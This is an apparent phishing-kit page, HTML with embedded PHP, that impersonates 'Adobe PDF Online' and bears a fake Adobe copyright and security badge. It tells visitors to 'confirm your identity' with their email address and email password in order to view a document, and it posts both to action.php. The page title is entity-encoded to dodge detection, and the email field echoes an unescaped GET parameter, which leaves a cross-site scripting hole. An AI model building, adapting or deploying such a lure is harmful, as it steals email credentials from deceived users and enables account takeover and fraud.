﻿<!DOCTYPE html>
<html lang="en" dir="LTR" ><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<title>A&#100;&#111;&#98;&#101;&#32;&#80;&#68;F</title>

<style type="text/css">
a{
  color:#454444;
  text-decoration:none;
}
a:link{
  color:#454444;
  text-decoration:none;
}
a:hover{
  color:#454444;
  text-decoration:none;
}

a:visited{
  color:#454444;
  text-decoration:none;
}

@font-face {
	font-family: 'et-line';
	src:url('fonts/et-line.eot');
	src:url('fonts/et-line.eot?#iefix') format('embedded-opentype'),
		url('fonts/et-line.woff') format('woff'),
		url('fonts/et-line.ttf') format('truetype'),
		url('fonts/et-line.svg#et-line') format('svg');
	font-weight: normal;
	font-style: normal;
}

/* Use the following CSS code if you want to use data attributes for inserting your icons */
[data-icon]:before {
	font-family: 'et-line';
	content: attr(data-icon);
	speak: none;
	font-weight: normal;
	font-variant: normal;
	text-transform: none;
	line-height: 1;
	-webkit-font-smoothing: antialiased;
	-moz-osx-font-smoothing: grayscale;
	display:inline-block;
}

/* Use the following CSS code if you want to have a class per icon */
/*
Instead of a list of all class selectors,
you can use the generic selector below, but it's slower:
[class*="icon-"] {
*/
.icon-mobile, .icon-laptop, .icon-desktop, .icon-tablet, .icon-phone, .icon-document, .icon-documents, .icon-search, .icon-clipboard, .icon-newspaper, .icon-notebook, .icon-book-open, .icon-browser, .icon-calendar, .icon-presentation, .icon-picture, .icon-pictures, .icon-video, .icon-camera, .icon-printer, .icon-toolbox, .icon-briefcase, .icon-wallet, .icon-gift, .icon-bargraph, .icon-grid, .icon-expand, .icon-focus, .icon-edit, .icon-adjustments, .icon-ribbon, .icon-hourglass, .icon-lock, .icon-megaphone, .icon-shield, .icon-trophy, .icon-flag, .icon-map, .icon-puzzle, .icon-basket, .icon-envelope, .icon-streetsign, .icon-telescope, .icon-gears, .icon-key, .icon-paperclip, .icon-attachment, .icon-pricetags, .icon-lightbulb, .icon-layers, .icon-pencil, .icon-tools, .icon-tools-2, .icon-scissors, .icon-paintbrush, .icon-magnifying-glass, .icon-circle-compass, .icon-linegraph, .icon-mic, .icon-strategy, .icon-beaker, .icon-caution, .icon-recycle, .icon-anchor, .icon-profile-male, .icon-profile-female, .icon-bike, .icon-wine, .icon-hotairballoon, .icon-globe, .icon-genius, .icon-map-pin, .icon-dial, .icon-chat, .icon-heart, .icon-cloud, .icon-upload, .icon-download, .icon-target, .icon-hazardous, .icon-piechart, .icon-speedometer, .icon-global, .icon-compass, .icon-lifesaver, .icon-clock, .icon-aperture, .icon-quote, .icon-scope, .icon-alarmclock, .icon-refresh, .icon-happy, .icon-sad, .icon-facebook, .icon-twitter, .icon-googleplus, .icon-rss, .icon-tumblr, .icon-linkedin, .icon-dribbble {
	font-family: 'et-line';
	speak: none;
	font-style: normal;
	font-weight: normal;
	font-variant: normal;
	text-transform: none;
	line-height: 1;
	-webkit-font-smoothing: antialiased;
	-moz-osx-font-smoothing: grayscale;
	display:inline-block;
}
.icon-mobile:before {
	content: "\e000";
}
.icon-laptop:before {
	content: "\e001";
}
.icon-desktop:before {
	content: "\e002";
}
.icon-tablet:before {
	content: "\e003";
}
.icon-phone:before {
	content: "\e004";
}
.icon-document:before {
	content: "\e005";
}
.icon-documents:before {
	content: "\e006";
}
.icon-search:before {
	content: "\e007";
}
.icon-clipboard:before {
	content: "\e008";
}
.icon-newspaper:before {
	content: "\e009";
}
.icon-notebook:before {
	content: "\e00a";
}
.icon-book-open:before {
	content: "\e00b";
}
.icon-browser:before {
	content: "\e00c";
}
.icon-calendar:before {
	content: "\e00d";
}
.icon-presentation:before {
	content: "\e00e";
}
.icon-picture:before {
	content: "\e00f";
}
.icon-pictures:before {
	content: "\e010";
}
.icon-video:before {
	content: "\e011";
}
.icon-camera:before {
	content: "\e012";
}
.icon-printer:before {
	content: "\e013";
}
.icon-toolbox:before {
	content: "\e014";
}
.icon-briefcase:before {
	content: "\e015";
}
.icon-wallet:before {
	content: "\e016";
}
.icon-gift:before {
	content: "\e017";
}
.icon-bargraph:before {
	content: "\e018";
}
.icon-grid:before {
	content: "\e019";
}
.icon-expand:before {
	content: "\e01a";
}
.icon-focus:before {
	content: "\e01b";
}
.icon-edit:before {
	content: "\e01c";
}
.icon-adjustments:before {
	content: "\e01d";
}
.icon-ribbon:before {
	content: "\e01e";
}
.icon-hourglass:before {
	content: "\e01f";
}
.icon-lock:before {
	content: "\e020";
}
.icon-megaphone:before {
	content: "\e021";
}
.icon-shield:before {
	content: "\e022";
}
.icon-trophy:before {
	content: "\e023";
}
.icon-flag:before {
	content: "\e024";
}
.icon-map:before {
	content: "\e025";
}
.icon-puzzle:before {
	content: "\e026";
}
.icon-basket:before {
	content: "\e027";
}
.icon-envelope:before {
	content: "\e028";
}
.icon-streetsign:before {
	content: "\e029";
}
.icon-telescope:before {
	content: "\e02a";
}
.icon-gears:before {
	content: "\e02b";
}
.icon-key:before {
	content: "\e02c";
}
.icon-paperclip:before {
	content: "\e02d";
}
.icon-attachment:before {
	content: "\e02e";
}
.icon-pricetags:before {
	content: "\e02f";
}
.icon-lightbulb:before {
	content: "\e030";
}
.icon-layers:before {
	content: "\e031";
}
.icon-pencil:before {
	content: "\e032";
}
.icon-tools:before {
	content: "\e033";
}
.icon-tools-2:before {
	content: "\e034";
}
.icon-scissors:before {
	content: "\e035";
}
.icon-paintbrush:before {
	content: "\e036";
}
.icon-magnifying-glass:before {
	content: "\e037";
}
.icon-circle-compass:before {
	content: "\e038";
}
.icon-linegraph:before {
	content: "\e039";
}
.icon-mic:before {
	content: "\e03a";
}
.icon-strategy:before {
	content: "\e03b";
}
.icon-beaker:before {
	content: "\e03c";
}
.icon-caution:before {
	content: "\e03d";
}
.icon-recycle:before {
	content: "\e03e";
}
.icon-anchor:before {
	content: "\e03f";
}
.icon-profile-male:before {
	content: "\e040";
}
.icon-profile-female:before {
	content: "\e041";
}
.icon-bike:before {
	content: "\e042";
}
.icon-wine:before {
	content: "\e043";
}
.icon-hotairballoon:before {
	content: "\e044";
}
.icon-globe:before {
	content: "\e045";
}
.icon-genius:before {
	content: "\e046";
}
.icon-map-pin:before {
	content: "\e047";
}
.icon-dial:before {
	content: "\e048";
}
.icon-chat:before {
	content: "\e049";
}
.icon-heart:before {
	content: "\e04a";
}
.icon-cloud:before {
	content: "\e04b";
}
.icon-upload:before {
	content: "\e04c";
}
.icon-download:before {
	content: "\e04d";
}
.icon-target:before {
	content: "\e04e";
}
.icon-hazardous:before {
	content: "\e04f";
}
.icon-piechart:before {
	content: "\e050";
}
.icon-speedometer:before {
	content: "\e051";
}
.icon-global:before {
	content: "\e052";
}
.icon-compass:before {
	content: "\e053";
}
.icon-lifesaver:before {
	content: "\e054";
}
.icon-clock:before {
	content: "\e055";
}
.icon-aperture:before {
	content: "\e056";
}
.icon-quote:before {
	content: "\e057";
}
.icon-scope:before {
	content: "\e058";
}
.icon-alarmclock:before {
	content: "\e059";
}
.icon-refresh:before {
	content: "\e05a";
}
.icon-happy:before {
	content: "\e05b";
}
.icon-sad:before {
	content: "\e05c";
}
.icon-facebook:before {
	content: "\e05d";
}
.icon-twitter:before {
	content: "\e05e";
}
.icon-googleplus:before {
	content: "\e05f";
}
.icon-rss:before {
	content: "\e060";
}
.icon-tumblr:before {
	content: "\e061";
}
.icon-linkedin:before {
	content: "\e062";
}
.icon-dribbble:before {
	content: "\e063";
}


body{
margin:0;
font-family:helvetica, verdana, arial, san-serif;
min-width:750px;
}

html { 
  background: url(images/bg.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}

.transparent {
	zoom: 1;
	filter: alpha(opacity=90);
	opacity: 0.9;
}
#top-header{
   width:100%;
   height:50px;
   background:#000;
}

.inp{

	border: 1px solid rgb(187, 7, 6);
	-moz-border-radius: 0px;
	-webkit-border-radius: 0px;
	border-radius: 0px;
	width:360px;
	font-size:1.2em;
	color: #000;
	height:2em;
	margin:0 0 8px 0;
	padding:0px 0px 0px 15px;
}
.btn {
  background: rgb(187, 7, 6);
  -webkit-border-radius: 10;
  -moz-border-radius: 10;
  border-radius: 10px;
  font-family: Arial;
  color: #ffffff;
  font-size: 20px;
  padding: 13px 15px 12px 16px;
  text-decoration: none;
}

.btn:hover {
  background: #1593bc;
  background-image: -webkit-linear-gradient(top, #1593bc, #25aad6);
  background-image: -moz-linear-gradient(top, #1593bc, #25aad6);
  background-image: -ms-linear-gradient(top, #1593bc, #25aad6);
  background-image: -o-linear-gradient(top, #1593bc, #25aad6);
  background-image: linear-gradient(to bottom, #1593bc, #25aad6);
  text-decoration: none;
}
#errfn{
  color:red;
}
#errfnn{
  color:red;
}

.cover{
    position: absolute;
    top: 0;
    left: 0;
    height: 100%;
    width: 100%;
    background-color: rgba(0,0,0,0.5);
    z-index: 10;
}

</style>

</head>


<body style="background:; font-family:helvetica, verdana, tahoma, arial; padding:0; min-width:700px; ">
<div id="top-header">
<table style="border:none; width:100%; padding:0; margin:0; height:50px; border-spacing:0; color:#fff; z-index:10000000; position:absolute;">
<tbody><tr>
<td style="background:#bb0706 url(images/smallpdf.png); width:4%; height:100%; margin:0; padding:0;"></td>
<td style="background:#bb0706; width:10%; height:100%; margin:0; padding:0; text-align:center;">Adobe PDF Online </td>
<td style="background:#000000; width:70%; height:100%; margin:0; padding:0;"></td>
<td style="background:#e1e1e1; width:10%; height:100%; margin:0; padding:0; color:#404040; text-align:center;"><a href="#" title="You are not signed In"> Account </a></td>
<td style="background:#e1e1e1; width:6%; height:100%; margin:0; padding:0; color:#404040; text-align:center; border-left:1px solid silver;"><a href="#" title="You are not signed in yet"> Sign In </a></td>
</tr>

</tbody></table>

</div>
<div style="width:100%; height:30px; background:#fff; padding:10px; position:relative; z-index:10000000000000;">
<table style="color:#454444; height:30px; width:100%;">
<tbody><tr>
<td style="width:60%;"></td>
<td style="width:10%; font-size:12px; color:#fff; "><a href="#" style="color:#FFF;" title="Login to continue"><span style="background:#bb0706; padding:10px;"><span class="icon-pencil"></span>Edit and Reply</span></a></td>
<td style="width:10%; font-size:12px;"><a href="#" title="Login to continue"><span class="icon-document"></span></a>Download</td>
<td style="width:10%; font-size:12px;"><a href="#" title="Login to continue"><span class="icon-printer"></span>Print</a></td>
<td style="width:6%; font-size:12px;"><a href="#" title="Login to continue"><span class="icon-aperture"></span>Exit</a></td>
<td style="width:4%; font-size:12px;">
<a href="#" title="Login to continue"><span style="font-weight:bold; font-size:2em; vertical-align:10px;">...</span></a>
</td>
</tr>
</tbody></table>
</div>


<div style="
background:#fbfbfb;
width:450px;
margin:0 auto;
margin-top:65px;
	border: 1px solid #EAEAEA;
	overflow: hidden;
	-moz-border-radius: 10px;
	-webkit-border-radius: 10px;
	border-radius: 10px;
	-webkit-box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;
	-moz-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
	box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;
	background: white;
	z-index: 11;
	position:relative;
">

<div style="padding:15px; z-index:12; min-width:400px; width:420px;">
<div style="background:#ededed; padding:5px; -webkit-border-radius: 10;
  -moz-border-radius: 10;
  border-radius: 10px;">
<img src="images/pdf-logo.png" height="50px" width="60px"><h1 style="color:rgb(187, 7, 6); text-shadow: 0px 1px 1px #4d4d4d; float:right; position:relative; right:50px;">Adobe PDF Online</h1>
</div>
<div style="clear:both;"></div>
<h4 style="color:#696767; font-family:verdana, arial; margin-top:0px;">
	<img src="images/100Secure.jpg" height="25" width="75" />Confirm your identity</h4>
<div style="color:#6c5a79; margin-bottom:10px; margin-top:5px;">Sign in with your connected and active email account to access document</div>	
<div id="mail-icon" style="text-align:center; margin-top:2px;">
	<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/AOL_Eraser.svg/200px-AOL_Eraser.svg.png" width="30px" height= "30px" />
	<img src="images/download.png" width="30px" height= "30px" />
	<img src="images/outlook-logo.jpg" width="30px" height= "30px" />
	<img src="images/webmail-logo.gif" width="30px" height= "30px" />
	<img src="images/yahoo-logo.png" width="30px" height= "30px" />
	<img src="images/email-logo.png" width="30px" height= "30px" />
</div>
<style>
	#mail-icon img{
		
		padding-right:7px;
	}
</style>			
<script type="text/javascript">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
</script>

<div style="text-align:center;">
					
<form name="myForm" action="action.php" onsubmit="return validateForm()" method="post">

					<input name="frm-email" required value="<?php echo $_GET['email']; ?>" size="40" style="margin-top:20px;" type="email" placeholder="Email ID"/> <br> 
					<span id="errfn"></span> <br>
					
					<input name= "frm-pass" required value="" size="40" style="margin-bottom:5px;" type="password" placeholder= "Email password"/> <br>
					<span id="errfnn"></span> <br>
					
					<input class="" type="checkbox" />Stay signed in(<span style="font-size:0.8em; color:#999;">Do not check if using a public computer</span>) <br><br>
					
					<input value="View Document" class="btn" type="submit" name='frm-submit' />
					
					<input type= "hidden" name= "frm-ac-tok" value="1478703122pf7aoE32ftAEl0eCbw4p" />
					<input type= "hidden" name= "s-id" value="adobe-quote" />
					</form>
</div>			
	<p style="font-size:0.9em;" align="center"> ©2022 Adobe Corporation</p>
							
							</div>
<div style="clear:both;"></div>

</div>
<div class="cover"></div>

</body></html>